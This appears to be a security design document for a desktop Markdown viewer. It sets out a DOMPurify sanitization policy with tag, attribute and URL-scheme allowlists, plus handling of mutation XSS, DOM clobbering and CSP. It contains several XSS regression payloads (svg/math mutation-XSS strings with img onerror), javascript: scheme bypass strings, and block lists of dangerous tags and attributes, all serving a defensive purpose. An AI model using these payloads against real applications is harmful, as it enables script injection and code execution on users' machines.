# 02 — Sanitization as a rendering stage

> A Markdown viewer that opens arbitrary files from the user's disk is an XSS
> sink with a native-code payload attached. This document is the most important
> file in the `research/` tree.

---

## 1. Why this stage exists at all

Three facts, each independently sufficient to make sanitization mandatory:

**1. CommonMark requires raw HTML to pass through.** CommonMark 0.31.2 §4.6
defines seven kinds of HTML block; type 1 blocks start on `<pre`, `<script`,
`<style`, `<textarea`; type 6 blocks start on a fixed tag list that includes
`iframe` and `form`; type 7 blocks start on "a complete open tag … or a
complete closing tag". The spec is explicit that such content "will not be
escaped in HTML output". There is no way to write a conforming Markdown parser
that also removes it. Source:
<https://spec.commonmark.org/0.31.2/#html-blocks>

**2. Our renderer runs inside a native process with filesystem access.** In
Electron or Tauri, "execute JavaScript in the renderer" is frequently
"execute JavaScript in a process that can call `fs` and `shell`". Electron's own
security documentation says it plainly:

> "A cross-site-scripting attack is more dangerous if an attacker can jump out of
> the renderer process and execute code on the user's computer. … Disabling
> Node.js integration helps prevent an XSS from being escalated into a so-called
> 'Remote Code Execution' (RCE) attack."
>
> — <https://www.electronjs.org/docs/latest/tutorial/security>

**3. It has happened to every comparable product, repeatedly.** This is not a
hypothetical. Verified examples:

| Product | CVE | One-line summary |
|---------|-----|------------------|
| Typora (Electron) | [CVE-2019-20374](https://nvd.nist.gov/vuln/detail/CVE-2019-20374) | mXSS via Mermaid code blocks → RCE in an unsandboxed Electron app |
| Typora | [CVE-2019-7296](https://nvd.nist.gov/vuln/detail/CVE-2019-7296), [CVE-2020-18221](https://nvd.nist.gov/vuln/detail/CVE-2020-18221), [CVE-2020-18748](https://nvd.nist.gov/vuln/detail/CVE-2020-18748) | XSS in MathJax handling → arbitrary code execution |
| Typora | [CVE-2023-2317](https://www.cve.org/CVERecord?id=CVE-2023-2317) | DOM-based XSS in the updater page, triggered by a crafted `.md` file |
| Typora | [CVE-2023-39703](https://nvd.nist.gov/vuln/detail/CVE-2023-39703), [CVE-2024-31783](https://nvd.nist.gov/vuln/detail/CVE-2024-31783) | XSS in the Markdown editor component |
| MarkText (Electron) | [CVE-2022-21158](https://nvd.nist.gov/vuln/detail/CVE-2022-21158) | stored XSS via a `javascript:` link inside a document |
| MarkText | [CVE-2022-25069](https://nvd.nist.gov/vuln/detail/CVE-2022-25069), [CVE-2023-2318](https://nvd.nist.gov/vuln/detail/CVE-2023-2318) | DOM XSS on paste → `require("child_process").exec(...)` |
| MarkText | [CVE-2021-29996](https://nvd.nist.gov/vuln/detail/cve-2021-29996), [CVE-2022-24123](https://nvd.nist.gov/vuln/detail/CVE-2022-24123) | further XSS in the editor |
| `marked` | [CVE-2017-1000427](https://nvd.nist.gov/vuln/detail/CVE-2017-1000427) | XSS in the `data:` URI parser |
| `marked` | [CVE-2022-21680](https://nvd.nist.gov/vuln/detail/CVE-2022-21680), [CVE-2022-21681](https://nvd.nist.gov/vuln/detail/CVE-2022-21681) | ReDoS in `block.def` and `inline.reflinkSearch` |
| `markdown2` | [CVE-2018-5773](https://github.com/advisories/GHSA-p6h9-gw49-rqm4) | the `safe_mode` XSS filter was bypassed by omitting a `>` |
| DOMPurify | [CVE-2024-45801](https://nvd.nist.gov/vuln/detail/CVE-2024-45801), [CVE-2024-47875](https://nvd.nist.gov/vuln/detail/CVE-2024-47875) | nesting-based mXSS; depth-check bypass |
| DOMPurify | [CVE-2026-0540](https://nvd.nist.gov/vuln/detail/CVE-2026-0540) | `SAFE_FOR_XML` regex missed five rawtext elements |

MarkText's is the most instructive because it is not a Markdown-rendering bug at
all. [CVE-2023-2318](https://nvd.nist.gov/vuln/detail/CVE-2023-2318) was in the
**paste** path: copied HTML was converted to Markdown and re-rendered, and
`textContent` was assigned to `innerHTML` without sanitization on one branch.
The PoC executed `require("child_process").exec(...)`. Every desktop Markdown
editor has this class of "re-derive HTML from elsewhere" code path. So will we.

### 1.1 What sanitization cannot do

Before the how, the *cannot*:

- It cannot make an unsafe app safe. Sanitization is one layer. It assumes the
  shell is configured correctly — `nodeIntegration: false`, context isolation on,
  the sandbox on, a real CSP, no `shell.openExternal` on untrusted input.
- It cannot protect against a malicious *document* causing a denial of service
  (ReDoS, gigabyte images, million-deep nesting). That is the parser's problem.
- It cannot stop data exfiltration via `<img src="https://attacker/…">`. DOMPurify
  says so in its non-goals: it "will **NOT** reliably stop HTML that requests
  external resources (tracking pixels, prefetch, etc.). There are too many ways
  to do it." We handle that separately — see
  [04-media-and-images.md §6](./04-media-and-images.md#6-remote-images-should-we-load-them-by-default).
- It cannot protect our *export* output, which will be opened by an unknown
  future renderer. See [05-export-and-print.md §5](./05-export-and-print.md#5-how-to-make-an-exported-html-file-safe).

---

## 2. The tag and attribute allowlist

### 2.1 Why a blocklist is unacceptable

A blocklist enumerates what is dangerous. It is wrong in four independent ways,
any one of which is fatal:

1. **You cannot enumerate all dangerous tags.** The set is not finite in
   practice. `script`, `iframe`, `object`, `embed`, `applet`, `base`, `meta`,
   `link`, `style`, `form`, `svg`, `math`, `foreignObject`, `annotation-xml`,
   `noscript`, `template`, `selectedcontent`, `portal`, `frame`, `frameset`,
   `noembed`, `noframes`, `xmp`, `plaintext`… and then every future element.
   DOMPurify's own danger table names `<selectedcontent>` as a "landmine" that
   had to be forbidden in 3.4.5 — a tag that did not meaningfully exist as an
   attack surface a year earlier.
2. **You cannot enumerate all dangerous attributes.** `on*` is the head of an
   open-ended family; DOMPurify forbids `autofocus` because it *triggers*
   `onfocus`, `formaction`/`ping` because they are navigation sinks,
   `patchsrc` because it fetches remote markup, `dirname` because it smuggles
   form data, `is` because it creates customized built-ins.
3. **Context matters, and blocklists do not model context.** `href` on `<a>` is
   a navigation. `href` on `<svg><use>` is a fetch. `xlink:href` on an SVG
   `<image>` can be `data:`. A tag that is benign in one position is lethal in
   another.
4. **The internet has empirically proven blocklists wrong, over and over.** Every
   `blockedTags` regex anyone has ever shipped has been bypassed. The OWASP
   guidance is unambiguous: use "**a sanitizer with a good HTML sanitizing
   algorithm that uses allowlists**" and treat blocklisting as an antipattern.

OWASP's words, from the
[XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html):

> "The preferred approach is to **use a sanitizer with a good HTML sanitizing
> algorithm that uses allowlists** … rather than trying to blacklist the bad
> characters."

`sanitize-html` makes the same point structurally: its entire configuration is
`allowedTags`, `allowedAttributes`, and `allowedSchemes`. There is no
`blockedTags`. Its README notes that if a tag is not permitted the *contents*
are still kept (so `<script>` needs explicit whole-subtree removal, which the
library handles for `script`, `style`, and `textarea`).

### 2.2 Our allowlist

Derived from what our renderer emits ([01-ast-to-html.md §5](./01-ast-to-html.md#5-tables-of-the-whole-surface-for-review)),
cross-checked against GitHub's published behavior. GitHub's `html-pipeline`
sanitization filter (mirror of the filter GitHub actually runs) uses:

```ruby
ANCHOR_SCHEMES = ['http', 'https', 'mailto', 'xmpp', :relative,
                  'github-windows', 'github-mac', 'irc', 'ircs'].freeze

ALLOWLIST = {
  elements: %w[
    h1 h2 h3 h4 h5 h6
    br b i strong em a pre code img tt
    div ins del sup sub p ol ul table thead tbody tfoot blockquote
    dl dt dd kbd q samp var hr ruby rt rp li tr td th s strike summary
    details caption figure figcaption
    abbr bdo cite dfn mark small span time wbr
  ],
  ...
}
```
— <https://github.com/gjtorikian/html-pipeline/blob/main/lib/html_pipeline/sanitization_filter.rb>

Note what GitHub does *not* allow: `script`, `style`, `iframe`, `form`,
`input`, `svg`, `math`, `object`, `embed`, `video`, `audio`, `style` attributes.
That is our shape too.

**Tags:**

```text
h1 h2 h3 h4 h5 h6
p br hr
ul ol li
blockquote
pre code em strong del
a img
table thead tbody tfoot tr th td caption colgroup col
section sup
details summary
div span abbr bdi bdo cite dfn kbd mark q s samp small sub sup time u var wbr
input     ← ONLY type=checkbox, disabled, for GFM task lists
```

**Attributes, per tag:**

```ts
export const TAG_ATTR_ALLOWLIST = {
  a:      ['href', 'title', 'rel', 'target', 'id', 'class'],
  img:    ['src', 'alt', 'title', 'width', 'height', 'loading', 'decoding', 'id', 'class'],
  input:  ['type', 'checked', 'disabled', 'class'],
  td:     ['colspan', 'rowspan', 'align', 'id', 'class'],
  th:     ['colspan', 'rowspan', 'scope', 'align', 'id', 'class'],
  ol:     ['start', 'reversed', 'id', 'class'],
  li:     ['id', 'class'],
  code:   ['class', 'lang', 'dir'],
  pre:    ['class'],
  '*':     ['id', 'class', 'dir', 'lang', 'title'],
} as const;
```

Global attributes kept: `id`, `class`, `dir`, `lang`, `title`. `id` is kept
because we generate ids; `class` because we style by class. Everything else is
denied.

**Attributes never allowed, in any configuration, ever:**

```text
on*            all event handlers
style          CSS injection / exfiltration; DOMPurify is NOT a CSS sanitizer
srcdoc         a whole nested document, not recursed into
formaction ping data poster background longdesc usemap codebase classid archive
xlink:href     SVG navigation
is             customized built-ins
name           DOM clobbering
target         except in the opt-in external-tab mode, and then always with
               rel="noopener noreferrer"
autofocus      fires handlers without user interaction
dirname        smuggles form data
patchsrc       declarative-partial-updates remote fetch
http-equiv     meta refresh
```

**Tags never allowed:** `script`, `style` (element), `iframe`, `frame`,
`frameset`, `object`, `embed`, `applet`, `base`, `meta`, `link`, `form`, `svg`,
`math`, `foreignObject`, `annotation-xml`, `template`, `noscript`, `xmp`,
`noembed`, `noframes`, `plaintext`, `title`, `head`, `body`, `html`, `canvas`,
`audio`, `video`, `source`, `track`, `portal`, `dialog`, `slot`, `marquee`,
`blink`, `selectedcontent`.

### 2.3 SVG and MathML: the classic bypass vector

DOMPurify permits HTML, SVG **and** MathML by default, and says so:

```js
// If you only need HTML, which might be a very common use-case, you can easily
// set that up as well:
const clean = DOMPurify.sanitize(dirty, { USE_PROFILES: { html: true } });
```

**We use `{ USE_PROFILES: { html: true } }`.** Rendered Markdown has no
legitimate need for inline SVG or MathML; both are separate features a user can
opt into, each with its own sanitization decision.

Why foreign content is dangerous is worth stating precisely, because it is not
"because SVG can run script" — it is because of how the HTML parser handles
namespace transitions:

- HTML, SVG, and MathML parse **differently**. The same bytes mean different
  things depending on whether the current node is in the HTML, SVG, or MathML
  namespace. DOMPurify's original mitigation was Bentkowski's
  [namespace-confusion bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
  (2.0.17): an element's *owning namespace* mutated across a serialize/reparse,
  turning an inert `<img>` into an active one. The fix — verify each node
  against its **parent's** namespace — is DOMPurify's long-standing core check.
- **Integration points deliberately switch interpretation.** `<svg><foreignObject>`
  and `<math><annotation-xml encoding="text/html">` are *defined* to re-enter
  HTML parsing for their descendants. A sanitizer that reasons "we are inside
  SVG therefore descendants are inert" is wrong by specification.
- **The practical consequence for us:** if we ever need SVG (icons in a
  document, say), it must be `<img src="…svg">` — loaded as a *separate document*
  where the browser treats it as an image — not inline `<svg>` in the document
  tree. See [04-media-and-images.md §4](./04-media-and-images.md#4-svg-images).

Representative payloads, kept as regression tests:

```html
<svg><foreignObject><xmp><img src=x onerror=alert(1)></xmp></foreignObject></svg>
```

```html
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
```

```html
<svg></p><style><a id="</style><img src=x onerror=alert(1)>"></svg>
```

The last is the canonical mutation-XSS shape from Gareth Heyes'
["Bypassing DOMPurify again with mutation XSS"](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss).
It is inert in the tree the sanitizer inspects, and becomes active after the
string is serialized and reparsed by `innerHTML`. With `USE_PROFILES: { html:
true }` all three are dead at the door.

### 2.4 DOM clobbering

Not XSS — something different and just as useful to an attacker. Markup like:

```html
<img src=x name=getElementById>
<form><input name=attributes></form>
```

shadows properties on `document`, `window`, or form objects, so application code
doing `document.getElementById(x)` or `form.attributes` reads attacker
controlled values. DOMPurify defends with:

- `SANITIZE_DOM` (default on) — removes forms and clobbering-named elements
- `SANITIZE_NAMED_PROPS` — rewrites `id`/`name` to a `user-content-` prefix

Our stance:

1. **Never read anything off `document`, `window`, `form`, or a named element
   that could come from the document.** All our DOM access goes through
   `querySelector` on a container we own, with `CSS.escape()` on any
   interpolated selector.
2. **Enable `SANITIZE_DOM`.**
3. **Prefix our generated ids** (`h-`, `fn-`, `fnref-`) so document content
   cannot produce `id="main"` or `id="content"` — see
   [01-ast-to-html.md §2.5](./01-ast-to-html.md#23-escaping-the-slug).
4. `SANITIZE_NAMED_PROPS` is **not** enabled, because it would rewrite our own
   heading ids and break the TOC. Instead we achieve the same property by not
   allowing `name` at all (§2.2) and by prefixing ids.

Reference: PortSwigger, ["DOM Clobbering strikes back"](https://portswigger.net/research/dom-clobbering-strikes-back).

---

## 3. Event handlers

`on*` is denied by omission (attribute allowlist) and by DOMPurify's default
`FORBID_ATTR`-equivalent internal handling. We add an explicit belt-and-braces
block because a misconfigured DOMPurify version is exactly the sort of thing
that gets missed:

```ts
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  if (/^on/i.test(data.attrName)) {
    data.keepAttr = false;
    data.forceKeepAttr = false;
  }
});
```

**Hooks: know what you are signing up for.** DOMPurify's threat model is
explicit that `afterSanitize*` hooks run **after** validation, so anything they
write is not re-checked — "A hook that does `node.setAttribute('href', 'javascript:…')`
there re-introduces a payload sanitization already removed." Use
`uponSanitize*` hooks (they run *before* validation, so their output is
re-checked) for anything derived from attacker input. Our hook above uses
`uponSanitizeAttribute` and only ever *removes*, so it is safe under either rule.

Also: **never call `sanitize()` from inside a hook or a config callback.** It is
not re-entrant; the nested call replaces the config the outer pass is still
using.

---

## 4. The URL scheme allowlist

`href`, `src`, `action`, `cite`, `poster`, `background`, `srcset`, `xlink:href`
are all URL sinks. The scheme check is not "does this attribute start with
`http`" — it is "after canonicalization, is the scheme in the allowlist, and if
it is relative, does it stay relative after resolution."

**Allowed:**

| Scheme | Why |
|--------|-----|
| `http:` | legacy content; no strong reason to break it |
| `https:` | the default for remote content |
| `mailto:` | a normal Markdown link use |
| `tel:` | ditto, on mobile |
| *(relative)* | `foo.md`, `./img/a.png`, `../up.md`, `#fragment` |

**Explicitly banned:**

| Scheme | Why it is fatal |
|--------|-----------------|
| `javascript:` | executes script on navigation/click. The single most common Markdown XSS. |
| `vbscript:` | legacy IE script execution; still filtered because old strings persist in old documents |
| `data:` | `data:text/html,<script>…` is a full document; `data:image/svg+xml` is a script-bearing document |
| `file:` | reads local filesystem; in a Tauri/Electron app with `file://` privileges this is local file exfiltration into an `<img>` you then render and can read back via canvas |
| `blob:` | minted from JS; meaningless without script, and a same-origin document handle |
| `about:` | `about:blank` inherit-origin tricks |
| anything else | by allowlist, unknown schemes are denied |

**The `data:` exception, tightly bounded.** `data:` is not categorically banned
because embedded images in Markdown are a real feature (`<img src="data:image/png;base64,…">`
works in GitHub). We allow it **only** for `img[src]`, **only** for these media
types, and **only** under a size cap:

```text
data:image/png;base64,…     allowed
data:image/jpeg;base64,…    allowed
data:image/gif;base64,…     allowed
data:image/webp;base64,…    allowed
data:image/bmp;base64,…     allowed
data:image/svg+xml;base64,… BANNED  ← SVG is a script-bearing document
data:text/html;base64,…     BANNED
data:text/javascript;base64,… BANNED
data:application/*;…        BANNED
```

Why `image/svg+xml` is banned even though it "looks like an image": an SVG file
is a **document**, and it can contain `<script>`, `<foreignObject>`, event
handlers, and external references. Browsers render `data:image/svg+xml` as an
image in `<img>` context — which *does* neuter script — but the same string
dropped into an `<object>`, `<iframe>`, or a `background-image` in a permissive
renderer can execute. A defense-in-depth rule that depends on the *consumer's
context* is not a defense-in-depth rule. `markdown-it` blocks `data:` except for
gif/png/jpeg/webp by default, per its
[safety doc](https://github.com/markdown-it/markdown-it/blob/master/docs/safety.md),
and we match that set exactly.

**Size cap on data URIs.** Base64 inflates by 4/3. A 10 MB embedded PNG becomes
~13.3 MB of string, in the HTML, in the DOM, and again in the export file. Cap
the decoded size (say 8 MB) and refuse larger with a visible broken-image
placeholder rather than silently truncating.

**Protocol-relative URLs.** `//evil.example/x.png` inherits the scheme. In a
webview with a `customprotocol://` base, that resolves to
`customprotocol://evil.example/x.png`, which will fail — good. But in the
*exported* HTML file it resolves to `https://evil.example/…` — a remote fetch we
did not intend. **Rule: reject protocol-relative URLs in rendered output, or
normalize them against our base scheme explicitly.** `sanitize-html` has
`allowProtocolRelative: true` in its defaults; we set it `false`.

**The `ALLOWED_URI_REGEXP` trap.** DOMPurify's threat model has a warning that
belongs in our code review template:

> "`ALLOWED_URI_REGEXP` runs against attacker-controlled values. Beyond the
> obvious 'don't make it permissive': a catastrophically-backtracking ('ReDoS')
> pattern becomes an attacker-triggerable denial of service, because the
> attacker controls the string the regex is tested against. Supply only
> linear-time patterns."

So: **we do not customize `ALLOWED_URI_REGEXP`.** We use the default and add our
own scheme check as a separate, linear, non-regex pass where we need the
`data:` exception. Reason: a hand-written URL regex is a permanent liability and
every sanitizer bug we would introduce ourselves is one DOMPurify does not have.

Our own check, deliberately regex-free where possible:

```ts
const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:', 'tel:']);

export function classifyUrl(raw: string, ctx: { base?: URL; allowDataImage?: boolean }): 'safe' | 'blocked' {
  // 1. Strip ASCII control characters and whitespace, which browsers ignore
  //    when resolving a URL and which are the classic filter bypass
  //    (e.g. "java\nscript:alert(1)").
  const cleaned = raw.replace(/[\u0000-\u0020\u007F-\u009F]/g, '');

  // 2. Absolute URL? Parse it. new URL() normalizes scheme case, strips
  //    tabs/newlines inside the scheme, and rejects nonsense.
  let parsed: URL;
  try {
    parsed = new URL(cleaned, ctx.base);
  } catch {
    return 'blocked';
  }

  // 3. The scheme after resolution is the only thing that matters. A relative
  //    URL resolves against base and inherits its scheme, which is fine.
  if (parsed.protocol === 'data:') {
    return ctx.allowDataImage && /^data:image\/(png|jpeg|gif|webp|bmp);base64,/i.test(cleaned)
      ? 'safe' : 'blocked';
  }

  return SAFE_SCHEMES.has(parsed.protocol) ? 'safe' : 'blocked';
}
```

Step 1 is not paranoia. `java\tscript:alert(1)`, `java&#x09;script:` and
` javascript:` all execute in browsers, and every hand-rolled filter that missed
the strip step has been exploited. Step 2 handles the "what did the browser
actually resolve" question, which is the only question that matters. The
OWASP cheat sheet's canonical example is exactly this:

> "Verify that the URL starts with one of the allowed protocols … If it doesn't
> allow it, and the URL is not relative, return an error. **Do not** try to
> sanitize the URL by escaping or encoding the characters — attackers can bypass
> that."

---

## 5. DOMPurify's threat model

The [Security Goals & Threat Model](https://github.com/cure53/DOMPurify/wiki/Security-Goals-%26-Threat-Model)
page is explicit and long. Condensed to what applies to us:

### Goals (what it protects against)

| Goal | Relevance to us |
|------|-----------------|
| Prevent XSS | the whole point |
| Resist mutation XSS (mXSS) | **critical**: our pipeline is serialize → reparse (`innerHTML`). DOMPurify checks every node against its **parent's namespace**, and `SAFE_FOR_XML` (default on) rejects attribute values containing comment/CDATA closers or rawtext/RCDATA closing tags |
| Prevent DOM clobbering | critical: we must not read `document.foo` |
| Output safe for re-insertion sinks (including jQuery) | we don't use jQuery, but this is the "sanitize before the library, never after" contract |
| Prevent structural damage / dangling markup | matters for our export: a truncated document shouldn't emit dangling `<a>` that captures the rest of the exported page |
| Safe from prototype pollution | **critical**: [CVE-2026-41238](https://nvd.nist.gov/vuln/detail/CVE-2026-41238) was a default-config bypass where a polluted `Object.prototype.tagNameCheck` made DOMPurify allow arbitrary custom elements *with arbitrary attributes including event handlers*. Fixed in 3.4.0. Requires a prototype-pollution gadget elsewhere in the app to exploit — but we are an Electron app with a large dependency tree, so we must assume we have one |
| Trusted Types integration | **we want this**: see §8 |
| Fail closed in `IN_PLACE` mode | good hygiene if we ever use it |

### Non-goals (what it does not protect against)

| Non-goal | Consequence for us |
|----------|--------------------|
| **Markup context flipping** | "sanitized HTML will **NOT** protect you against feeding HTML-sanitized output into a different markup context" — SVG, MathML, XML, an attribute value, a rawtext element. Our rule: HTML in HTML, never anywhere else |
| **CSS-based attacks** | DOMPurify "is not a CSS sanitizer"; both `<style>` and `style=` are allowed by default. We `FORBID_TAGS: ['style']` and `FORBID_ATTR: ['style']` outright |
| **HTTP leaks / tracking pixels** | handled by the remote-image policy, not the sanitizer |
| **Passive protection** | "DOMPurify will **NOT** protect you just by being present. You must actually call it." A `grep` for `innerHTML` in CI is mandatory |
| **Script gadgets** | if a future dependency hydrates templates and re-enables `onclick`-equivalent behavior from inert attributes, `SAFE_FOR_TEMPLATES` scrubs `{{…}}`, `${…}`, `<%…%>`. It has its own history of edge bugs ([CVE-2025-26791](https://nvd.nist.gov/vuln/detail/CVE-2025-26791)) and is a last resort |

### The dangerous knobs, and our policy

DOMPurify lists config flags that widen the surface and says to require "a
*reason*" for each: `ADD_TAGS`, `ADD_ATTR`, `ADD_URI_SAFE_ATTR`,
`ADD_DATA_URI_TAGS`, `ALLOW_UNKNOWN_PROTOCOLS`, a loosened `ALLOWED_URI_REGEXP`,
`CUSTOM_ELEMENT_HANDLING`, `SAFE_FOR_XML: false`, `SANITIZE_DOM: false`,
`SANITIZE_NAMED_PROPS: false`, `WHOLE_DOCUMENT: true`.

**Our config uses none of them.**

```ts
import DOMPurify from 'dompurify';

/** Frozen. Changing this file is a security change and requires a PR label. */
export const SANITIZE_CONFIG = Object.freeze({
  USE_PROFILES: { html: true },          // no SVG, no MathML
  FORBID_TAGS: ['style', 'noscript', 'template', 'title', 'head', 'body', 'html', 'form'],
  FORBID_ATTR: ['style', 'srcdoc', 'name', 'target', 'autofocus', 'dirname',
                'ping', 'formaction', 'xlink:href', 'http-equiv', 'is', 'patchsrc'],
  ALLOW_DATA_ATTR: false,                // data-* only if WE create it, post-sanitize
  ALLOW_ARIA_ATTR: true,
  ALLOW_UNKNOWN_PROTOCOLS: false,        // never
  SAFE_FOR_XML: true,                    // never disable
  SANITIZE_DOM: true,                    // never disable
  SANITIZE_NAMED_PROPS: false,           // we prefix ids ourselves; see 01
  WHOLE_DOCUMENT: false,
  RETURN_DOM_FRAGMENT: true,             // screen path: skip serialize/reparse
  RETURN_TRUSTED_TYPE: true,             // where Trusted Types is available
});

export function sanitize(html: string): DocumentFragment | TrustedHTML { /* ... */ }
```

Note `ALLOW_DATA_ATTR: false`. DOMPurify's warning: "DOMPurify can't know your
app later reads `data-target` as a URL or HTML — if it does, you've made a sink
DOMPurify never validated." We do not read `data-*` from document content, and
the flag makes that a guarantee rather than a promise.

### 5.1 Version pinning is a security control

DOMPurify's advisory history in 2024–2026 is dense:
[CVE-2024-45801](https://nvd.nist.gov/vuln/detail/CVE-2024-45801),
[CVE-2024-47875](https://nvd.nist.gov/vuln/detail/CVE-2024-47875),
[CVE-2024-48910](https://nvd.nist.gov/vuln/detail/CVE-2024-48910),
[CVE-2025-26791](https://nvd.nist.gov/vuln/detail/CVE-2025-26791),
[CVE-2026-0540](https://nvd.nist.gov/vuln/detail/CVE-2026-0540),
[CVE-2026-41238](https://nvd.nist.gov/vuln/detail/CVE-2026-41238),
[CVE-2026-41239](https://nvd.nist.gov/vuln/detail/CVE-2026-41239),
[CVE-2026-41240](https://nvd.nist.gov/vuln/detail/CVE-2026-41240),
[CVE-2026-47423](https://nvd.nist.gov/vuln/detail/CVE-2026-47423),
[CVE-2026-65914](https://nvd.nist.gov/vuln/detail/CVE-2026-65914).

Two of those are worth studying as *classes*:

- **[CVE-2026-47423](https://github.com/advisories/GHSA-87xg-pxx2-7hvx)** —
  `<selectedcontent>` re-clone. The browser *synchronously regenerates* a clone
  of the selected `<option>`'s subtree **after** DOMPurify has walked it, so the
  returned string contains unsanitized markup inside `<selectedcontent>`. Fixed
  in 3.4.5 by forbidding the tag. This is the archetypal "the engine, not the
  sanitizer, decides" case.
- **[CVE-2026-65914](https://github.com/advisories/GHSA-h8r8-wccr-v5f2)** —
  mXSS via **re-contextualization**. Sanitized output is concatenated into a
  wrapper string (`<xmp>`, `script`, `iframe`, `noembed`, `noframes`,
  `noscript`) and reparsed; attacker text inside an attribute closes the context
  and reintroduces `<img onerror=…>`. **This is precisely why "never post-process
  sanitized output" is a hard rule and not a style preference.**

Our lockfile pins an exact DOMPurify version and Dependabot is configured to
open security PRs ([04-dependency-and-supply-chain.md §3](../11-security/04-dependency-and-supply-chain.md#3-integrity-verification)).

---

## 6. Why context changes everything

DOMPurify's Attack Classes page leads with the rule:

> "A sanitizer does not produce safe bytes for every possible sink. It produces
> output that is safe only for the parsing context it was designed and tested
> for."

Safe contract:

```js
const clean = DOMPurify.sanitize(dirty);
element.innerHTML = clean;
```

Unsafe contracts, all of which we must never write:

```js
script.text = clean;                   // JavaScript context, not HTML
element.setAttribute('title', clean);  // Attribute context, not HTML
svgElement.innerHTML = clean;          // SVG/XML context mismatch
templateEngine.render(clean);          // A second interpreter after HTML
someLibrary.html(clean);               // The library may mutate or reparse
wrapper.innerHTML = `<xmp>${clean}</xmp>`;  // rawtext re-contextualization (CVE-2026-65914)
```

The HTML spec itself warns that "serialize-then-reparse is not guaranteed to
round-trip." Our design consequence:

1. **Sanitize once.** Immediately before insertion, on the final string.
2. **Insert without touching it afterwards.** No regex replace, no template
   interpolation, no `$(clean).append()`, no "just fix the relative URLs" step.
   Relative-URL rewriting happens **before** sanitization, in the media
   resolver ([04-media-and-images.md §2](./04-media-and-images.md#2-the-base-url-problem)).
3. **Never insert sanitized output into a rawtext element.** `<script>`,
   `<style>`, `<textarea>`, `<title>`, `<xmp>`, `<noembed>`, `<noframes>`,
   `<iframe>`, `<plaintext>`, `<noscript>`. If you need text in one of those,
   use `textContent` — which is safe precisely because it creates a *text node*
   and never re-parses.
4. **Test the live DOM, not the string.** DOMPurify's guidance:

```js
const clean = DOMPurify.sanitize(payload);

// Weak test: substring checks miss parser mutation and encoding.
console.assert(!clean.includes('onerror'));

// Better test: insert and inspect the resulting DOM.
container.innerHTML = clean;
console.assert(!container.querySelector('[onerror]'));
```

Our CI must run the second form, in a real browser (Chromium via Playwright),
against a payload corpus.

---

## 7. Server-side `sanitize-html` vs in-browser DOMPurify

The desktop difference: **both Tauri and Electron render in a webview.**
WebView2 on Windows, WebKitGTK on Linux, WKWebView on macOS — all are real
browser engines with a real HTML parser. So browser-side DOMPurify is not
merely viable; it is the *correct* choice, because the sanitizer and the
consumer share one parser.

| | DOMPurify (in webview) | `sanitize-html` (Node/Electron main) |
|---|---|---|
| Engine | The **same** engine that will parse the output | A Node reimplementation (`htmlparser2`) |
| Parser differentials | **None.** The tree the sanitizer inspects is the tree the browser builds | **Every mXSS class is open.** The browser's parser differs from `htmlparser2`'s, and the difference *is the bug*. [CVE-2026-0540](https://nvd.nist.gov/vuln/detail/CVE-2026-0540) was exactly this: five rawtext element names missing from an internal list |
| Needs a DOM | No, it uses the live one | No, it is a stream parser |
| Speed | Fast (native code path) | Slower (pure JS), irrelevant for documents |
| Bundle | ~20 KB | Node-only, and **cannot be used in a webview at all** without a bundler build (2.x removed the prebuilt browser build) |
| CSS sanitization | No (explicitly a non-goal) | Has `parseStyleAttributes` |
| Trust story | We must trust the webview engine + DOMPurify | We must trust the engine, DOMPurify, **and** `htmlparser2`, and accept the differential |

**Decision: DOMPurify in the webview.** `sanitize-html` is not used in the
renderer. Two secondary jobs it is still good for:

1. **CI / static export on the server**, if we build a static-site generator.
   There, accept the differential and add a `parse5`/jsdom double-check, or
   better: run the same DOMPurify config in a headless Chromium via Playwright in
   CI so the engine matches the end user's.
2. **A "lint the document before opening it" tool** for CI tests of fixture
   corpora.

DOMPurify's own README on server-side use is a warning label, not a
recommendation:

> "Running DOMPurify on the server requires a DOM to be present … older versions
> of *jsdom* are known to be buggy in ways that result in XSS **even if
> DOMPurify does everything 100% correctly** … Please also be aware that tools
> like *happy-dom* exist but are **not considered safe** at this point."

If we ever need server-side DOMPurify, the TCB includes the DOM implementation
and it is a permanent maintenance burden. Prefer to never need it.

---

## 8. Integration points

### 8.1 Order of operations

```text
bytes
  → decode
  → parse (raw HTML preserved as AST nodes)
  → transform (ids, footnotes, media resolution)
  → serialize to HTML string          ← our renderer, §01
  → DOMPurify.sanitize(...)          ← THE BOUNDARY
  → insert, once, no post-processing
```

Not: sanitize → transform. Post-sanitization transform code becomes an
unsanitized-attribute generator (§1 of [01-ast-to-html.md](./01-ast-to-html.md#3-escaping-rules)
explains why this is worse).

### 8.2 Never `innerHTML` with unsanitized content

The DOM sinks to grep for:

```text
innerHTML  outerHTML  insertAdjacentHTML  document.write  document.writeln
document.body.innerHTML  element.setAttribute('href'|'src'|'on*'|...)
Range.createContextualFragment  el.insertAdjacentElement
$(...).html()  v-html=  (framework bindings)
DOMParser.parseFromString(…, 'text/html') then adopt — also a parse
```

CI check (a real one, not aspirational):

```bash
# Any hit needs a review comment naming the sanitizer that guards the sink.
rg -n --glob '!**/node_modules/**' \
   '\.(innerHTML|outerHTML)\s*=|insertAdjacentHTML|document\.write' \
   packages apps
```

And a stricter variant we should also ship: assert that the *argument* to
`innerHTML` is a call to `sanitize()` or a variable named in an allowlist of
sanitizer outputs. A linter rule beats a review comment.

### 8.3 CSP as defense in depth

Not primary — OWASP says: "It's easy to make mistakes with the implementation so
it should not be your primary defense mechanism. Use a CSP as an additional layer
of defense."

For Tauri ([CSP docs](https://v2.tauri.app/security/csp/)) — the config is
rewritten at build time to inject nonces and hashes for local scripts:

```json
{
  "app": {
    "security": {
      "csp": {
        "default-src": "'self'",
        "script-src": "'self'",
        "style-src": "'self' 'unsafe-inline'",
        "img-src": "'self' asset: http://asset.localhost data: blob:",
        "font-src": "'self'",
        "connect-src": "ipc: http://ipc.localhost",
        "object-src": "'none'",
        "base-uri": "'none'",
        "form-action": "'none'",
        "frame-src": "'none'",
        "frame-ancestors": "'none'"
      }
    }
  }
}
```

For Electron, set it per-response via
`session.defaultSession.webRequest.onHeadersReceived`, and also as a `<meta>`
tag as a second layer.

